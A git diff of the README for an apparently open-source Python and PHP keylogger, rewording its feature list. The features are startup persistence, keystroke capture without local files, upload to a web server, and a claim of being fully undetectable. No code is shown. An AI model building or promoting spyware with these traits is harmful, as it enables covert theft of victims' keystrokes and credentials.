@@ -1,6 +1,6 @@
 # Codezstruct_keylogger
 
-***This is an open source keylogger created using python 2.7 and php on server side. the codes was created and modified by codezstruct, credits also to ajin abraham for the codes that were used here. 
+***This is an open source keylogger created using python 2.7 and php on server side. the codes was created and modified by codezstruct, credits also to ajin abraham. 
 
 
 ‘’’You are free to reuse and modify the source code but only for educational purpose and research.’’’
@@ -21,13 +21,17 @@ Python Requirements:
 
 FEATURES:
 
-PERSISTENCY - RUN AT STARTUP AUTOMATICALLY, PERSISTENTLY RUNNING ONCE USER STARTS THE SYSTEM.
+1. PERSISTENCY - RUN AT STARTUP AUTOMATICALLY, PERSISTENTLY RUNNING ONCE USER STARTS THE SYSTEM.
 
-SAVES KEYSTROKES - FAST KEYSTROKE SAVING
+2. SAVES KEYSTROKES WITHOUT THE NEED TO CREATE AND SAVE A TEXT FILE LOCALLY
 
-SENDS TO SERVER - CUSTOM FTP SERVER SENDING 
+3. SENDS TO SERVER WEB SERVER  
 
-FUD - UNDETECTABLE 
+4. FUD - UNDETECTABLE 
 
-Can only run one at a time - DOES NOT ALLOW MULTIPLY INSTANCES TO BE RUNNING
+5. CAN ONLY EXECUTE THE PROGRAM ONE AT A TIME - DOES NOT ALLOW MULTIPLY INSTANCES TO BE RUNNING
+
+
+
+INCLUDE THE PHP SCRIPT IN THE SERVER SIDE.
 
